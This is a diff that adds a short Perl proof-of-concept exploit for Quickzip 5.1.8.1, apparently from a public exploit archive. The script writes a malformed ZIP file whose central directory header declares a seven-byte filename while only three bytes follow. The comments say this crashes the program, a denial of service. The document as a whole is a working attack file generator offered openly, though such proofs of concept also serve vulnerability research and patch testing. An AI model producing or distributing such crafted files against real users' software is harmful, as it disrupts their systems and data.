@@ -1,0 +1,38 @@
+# Exploit Title: Quickzip 5.1.8.1 Denial of Service Vulnerability
+# Date: 2010/11/02
+# Author: moigai
+# e-mail: again.liu@gmail.com
+# Version: 5.1.8.1
+# Tested on: Windows XP SP3 En (VM)
+# Greetz to: Yoji
+
+my $file = "boom.zip";
+
+my $localHeader = 
+"\x50\x4b\x03\x04" . #Local file header signature
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" . 
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";  
+
+my $centralDirHeader = 
+"\x50\x4b\x01\x02" . #central dir header signature
+"\x14\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" . 
+"\x07\x00" . #file name length
+"\x00\x00\x00\x00\x00\x00\x01\x00\x20\x00\x00\x00\x00\x00" .
+"\x00\x00";  
+
+# The program crashes when the file name is shorter than the length specified above.
+# In the case of length specified equals 0x7, the program crash when the actual length is smaller than 0x4
+my $filename = "yyy";
+
+my $endCentralDirHeader = 
+"\x50\x4b\x05\x06" . #end central dir header signature
+"\x00\x00\x00\x00\x01\x00\x01\x00\x35\x00\x00\x00\x1e\x00" .
+"\x00\x00\x00\x00"; 
+
+my $zip = $localHeader . $centralDirHeader . $filename . $endCentralDirHeader;
+print "\n[+] Creating zip file\n";
+open(FILE, ">$file");
+print FILE $zip;
+close(FILE);
+print "[+] File " . $file . " created\n";
